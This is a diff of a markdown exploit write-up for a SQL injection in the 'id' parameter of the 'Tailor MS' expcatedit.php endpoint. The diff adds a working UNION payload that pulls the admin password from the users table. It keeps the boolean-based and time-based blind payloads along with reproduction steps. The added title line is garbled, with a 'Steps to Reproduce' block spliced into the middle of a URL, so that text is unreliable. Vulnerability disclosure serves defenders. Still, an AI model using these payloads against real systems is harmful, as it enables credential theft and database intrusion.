@@ -1,4 +1,12 @@
-# Exploit Title: Tailor MS – SQL Injection in expcatedit.php (`http://localhost/tailor/expcatedit.php?id=1`)
+# Exploit Title: Tailor MS – SQL Injection in expcatedit.php (`h## Steps to Reproduce
+
+1. Browse to `http://localhost:8000/expcatedit.php?id=1`.  
+2. Intercept the request and inject the following payload into the `id` parameter:
+    ```
+    http://localhost:8000/expcatedit.php?id=-1' union select password from users where username='admin'-- -
+    ```
+3. Observe the extracted admin password displayed in the application (see screenshot above).
+4. Confirm DBMS fingerprinting and data extraction as permitted by the app's DB privileges.localhost:8000/expcatedit.php?id=1`)
 
 **Date:** 2025-08-11  
 **Exploit Author:** Anonymous  
@@ -20,31 +28,31 @@ A SQL Injection vulnerability exists in the `expcatedit.php` endpoint of **Tailo
 
 ### Affected Endpoint
 
-- **URL:** `http://localhost/tailor/expcatedit.php?id=1`
+- **URL:** `http://localhost:8000/expcatedit.php?id=1`
 - **HTTP Method:** GET
 - **Vulnerable File:** `expcatedit.php`
 - **Parameter:** `id`
 - **Vector Location:** GET
 
-### Injection Techniques (as identified by sqlmap)
+### Injection Techniques
 - **Type:** boolean-based blind
   - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
   - **Payload:** `id=1' AND 6294=(SELECT (CASE WHEN (6294=6294) THEN 6294 ELSE (SELECT 2673 UNION SELECT 5862) END))-- -`
 - **Type:** time-based blind
   - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
   - **Payload:** `id=1' AND (SELECT 6621 FROM (SELECT(SLEEP(5)))TBGj)-- pjgM`
-- **Type:** UNION query
-  - **Title:** Generic UNION query (NULL) - 1 column
-  - **Payload:** 
-```
-id=-2709' UNION ALL SELECT CONCAT(0x71786b7171,0x704b54677a4e57726b6d794a4e64416451736c445751616653794d7a6d4b736b784a505042794d45,0x717a766a71)-- -
-```
+- **Type:** UNION query (exfiltration)
+  - **Title:** UNION query to extract admin password - 1 column
+  - **Payload:**  
+    ```
+    http://localhost:8000/expcatedit.php?id=-1' union select password from users where username='admin'-- -
+    ```
 
 
 
-## Proof of Concept (Burp Repeater)
+## Proof of Concept (Firefox Screenshot)
 
-![burp-repeater-poc](poc.png)
+![exploit](exploit.png)
 
 ## SQLMap Summary
 
@@ -64,7 +72,7 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 
 ## Steps to Reproduce
 
-1. Browse to `http://localhost/tailor/expcatedit.php?id=1`.  
+1. Browse to `http://localhost:8000/expcatedit.php?id=1`.  
 2. Intercept the request and inject the provided payload(s) into parameter `expcatedit.php?&<param>=...`.  
 3. Observe conditional responses / time delays / injected row reflections per technique above.  
 4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.
@@ -74,7 +82,6 @@ The vulnerable parameter is reflected into the SQL statement without proper vali
 ![vulnerable-code](code_snippet.png)
 
 
-References
-OWASP: SQL Injection Prevention Cheat Sheet
-
+References  
+OWASP: SQL Injection Prevention Cheat Sheet  
 CWE-89: SQL Injection
